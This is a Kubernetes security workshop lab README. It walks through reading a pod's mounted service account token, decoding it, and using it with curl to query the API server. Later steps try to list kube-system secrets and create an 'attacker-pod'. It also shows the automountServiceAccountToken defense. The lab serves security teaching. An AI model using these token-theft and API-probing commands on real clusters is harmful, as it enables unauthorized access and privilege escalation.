# Container Service Account

Every pod in Kubernetes has a service account identity. By default, the corresponding token is automatically mounted into the container's filesystem. An attacker who gains shell access to any pod can read this token and use it to authenticate to the Kubernetes API server.

## Description

A service account (SA) represents an application identity in Kubernetes. By default, a service account access token is mounted into every created pod in the cluster, and containers in the pod can send requests to the Kubernetes API server using the service account credentials.

Attackers who get access to a pod can access the service account token (located in `/var/run/secrets/kubernetes.io/serviceaccount/token`) and perform actions in the cluster according to the service account's permissions. If RBAC is not enabled, the service account has unlimited permissions in the cluster. If RBAC is enabled, its permissions are determined by the RoleBindings or ClusterRoleBindings associated with it.

An attacker who obtains the service account token can also authenticate to the Kubernetes API server from outside the cluster and maintain persistent access.

This lab demonstrates both scenarios:

- **`ubuntu.yaml`**: Pod with a custom service account that has `get` and `list` permissions on `namespaces` cluster-wide.
- **`ubuntu-no-sa.yaml`**: Pod with `automountServiceAccountToken: false`, which prevents the token from being mounted at all.

## Prerequisites

- A running Kind cluster named `workshop-cluster`.
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### Step 1 - Deploy the pod with a mounted service account

```bash
kubectl apply -f ubuntu.yaml
```

Wait for the pod to be ready:

```bash
kubectl get pod ubuntu
```

Expected output:

```
NAME     READY   STATUS    RESTARTS   AGE
ubuntu   1/1     Running   0          10s
```

### Step 2 - Exec into the container

```bash
kubectl exec -it pod/ubuntu -- /bin/bash
```

### Step 3 - Install curl and jq

```bash
apt-get update && apt-get install -y curl jq python3
```

### Step 4 - Locate and inspect the service account files

Navigate to the service account directory:

```bash
cd /var/run/secrets/kubernetes.io/serviceaccount
ls -la
```

Expected output:

```
total 4
drwxrwxrwt 3 root root  140 Jan  1 00:00 .
drwxr-xr-x 3 root root 4096 Jan  1 00:00 ..
drwxr-xr-x 2 root root  100 Jan  1 00:00 ..2026_01_01_00_00_00.0000000000
lrwxrwxrwx 1 root root   32 Jan  1 00:00 ..data -> ..2026_01_01_00_00_00.0000000000
lrwxrwxrwx 1 root root   13 Jan  1 00:00 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Jan  1 00:00 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Jan  1 00:00 token -> ..data/token
```

Note: the timestamp-named directory (e.g. `..2026_01_01_00_00_00.0000000000`) varies per pod. The three important symlinks are `ca.crt`, `namespace`, and `token`.

Three files are present:

- **`ca.crt`** — The cluster's certificate authority. Used to verify the API server's TLS certificate.
- **`namespace`** — The namespace in which this pod runs.
- **`token`** — A JWT bearer token signed by the cluster. This is the service account credential.

Read the namespace and token:

```bash
cat namespace
echo ""
cat token
```

### Step 5 - Decode the JWT token

The token is a standard JWT. Decode its payload to see which service account it belongs to and when it expires:

```bash
# Split on '.' and decode the middle section (payload)
cat token | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
```

Expected output:

```json
{
  "aud": ["https://kubernetes.default.svc.cluster.local"],
  "exp": 1741516800,
  "iat": 1709980800,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "default",
    "pod": {
      "name": "ubuntu",
      "uid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    },
    "serviceaccount": {
      "name": "ubuntu-sa",
      "uid": "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy"
    }
  },
  "sub": "system:serviceaccount:default:ubuntu-sa"
}
```

You can also paste the token into [https://jwt.io](https://jwt.io) to inspect it visually.

### Step 6 - Call the Kubernetes API with the service account token

Set up environment variables:

```bash
APISERVER=https://kubernetes.default.svc.cluster.local
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

First, try without a token — the request is rejected:

```bash
curl -s --cacert $CACERT $APISERVER/api/v1/namespaces
```

Expected output:

```json
{
  "kind": "Status",
  "status": "Failure",
  "message": "namespaces is forbidden: User \"system:anonymous\" cannot list resource \"namespaces\" in API group \"\" at the cluster scope",
  "reason": "Forbidden",
  "code": 403
}
```

Now authenticate with the token:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | jq '.items[].metadata.name'
```

Expected output (varies by cluster — at minimum the four system namespaces will appear):

```
"default"
"kube-node-lease"
"kube-public"
"kube-system"
```

The service account can list namespaces across the entire cluster because of its ClusterRoleBinding.

### Step 7 - Enumerate what the service account can do

Check all permissions granted to this service account using the `can-i` API:

```bash
# From inside the pod — check specific permissions
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"default","verb":"list","resource":"secrets"}}}' \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  | jq '.status.allowed'
```

Expected output:

```
false
```

```bash
# Check namespace listing permission (this one should be allowed)
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"list","resource":"namespaces"}}}' \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  | jq '.status.allowed'
```

Expected output:

```
true
```

From outside the pod, you can audit the service account's permissions with:

```bash
kubectl auth can-i --list --as=system:serviceaccount:default:ubuntu-sa
```

### Step 8 - Demonstrate the defense: pod without a mounted token

Exit the current pod and redeploy without the service account token:

```bash
# Exit the pod
exit

# Delete the current pod and deploy without token mounting
kubectl delete -f ubuntu.yaml
kubectl apply -f ubuntu-no-sa.yaml
```

Wait for the pod:

```bash
kubectl get pod ubuntu
```

Exec in and attempt to access the service account directory:

```bash
kubectl exec -it pod/ubuntu -- /bin/bash
```

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

Expected output:

```
ls: cannot access '/var/run/secrets/kubernetes.io/serviceaccount/': No such file or directory
```

The token directory does not exist. The pod has no Kubernetes API credentials to steal.

## Exploiting the Token

The previous steps demonstrated extracting and inspecting a service account token. The following steps show what an attacker does next — probing the API for privilege escalation opportunities. Run these from inside the `ubuntu` pod deployed with `ubuntu.yaml` (re-deploy it if you cleaned it up).

### Step 9 — Attempt to list secrets across namespaces

With the token loaded from Step 6, probe for secrets cluster-wide:

```bash
APISERVER=https://kubernetes.default.svc.cluster.local
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Try listing secrets in kube-system (likely denied for this limited SA)
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets | jq '.message'
```

Expected output (the limited SA lacks `list secrets` permission):

```
"secrets is forbidden: User \"system:serviceaccount:default:ubuntu-sa\" cannot list resource \"secrets\" ..."
```

### Step 10 — Attempt to create a pod via the API

An attacker tries to spawn a new pod to escalate privileges or establish persistence:

```bash
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "attacker-pod", "namespace": "default"},
    "spec": {
      "containers": [{"name": "shell", "image": "alpine", "command": ["sleep","3600"]}]
    }
  }' \
  $APISERVER/api/v1/namespaces/default/pods | jq '{status: .status, message: .message}'
```

Expected output (denied — the SA only has `get`/`list` on `namespaces`):

```json
{
  "status": "Failure",
  "message": "pods is forbidden: User \"system:serviceaccount:default:ubuntu-sa\" cannot create resource \"pods\" ..."
}
```

### Step 11 — Compare: what a cluster-admin token can do

From outside the pod, generate a token with elevated privileges to see the contrast:

```bash
# Exit the pod first
exit

# Use kubectl (which has cluster-admin) to show what a privileged SA can do
kubectl auth can-i --list --as=system:serviceaccount:default:ubuntu-sa | head -10
echo "---"
kubectl auth can-i create pods --as=system:serviceaccount:default:ubuntu-sa
kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:default:ubuntu-sa
```

The limited SA returns `no` for both `create pods` and `list secrets`. If an attacker finds a service account bound to `cluster-admin` (e.g., from the Kubernetes Dashboard — see [Exposed Sensitive Interfaces](../exposed-sensitive-interfaces/README.md)), all of the above requests succeed.

## Cleanup

```bash
kubectl delete -f ubuntu.yaml 2>/dev/null || true
kubectl delete -f ubuntu-no-sa.yaml 2>/dev/null || true
```

## Resources

- [Kubernetes Service Accounts](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
- [Kubernetes RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Disabling Automatic Service Account Token Mounting](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#opt-out-of-api-credential-automounting)
- [MITRE ATT&CK - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
